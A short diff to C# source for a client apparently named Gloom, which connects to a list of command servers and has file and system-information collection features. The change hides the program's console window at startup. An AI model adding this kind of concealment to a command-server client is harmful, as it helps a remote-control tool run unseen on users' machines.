@@ -2,6 +2,7 @@
 using Gloom.Client.Features.FileIO;
 using Gloom.Client.Features.InfoCollector;
 using Gloom.Client.Features.InfoCollector.Wmi;
+using System.Runtime.InteropServices;
 
 namespace Gloom.Client
 {
@@ -15,8 +16,16 @@ namespace Gloom.Client
 			"ws://192.168.0.43:8683" // Connection succeed on here
 		};
 
+		[DllImport("kernel32.dll")]
+		static extern IntPtr GetConsoleWindow();
+
+		[DllImport("user32.dll")]
+		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
 		static void Main(string[] args)
 		{
+			ShowWindow(GetConsoleWindow(), 0); // hide
+
 			SimpleParallel.ForEach(CommandServers, async addr =>
 			{
 				var client = new MessageClient(new Uri(addr));
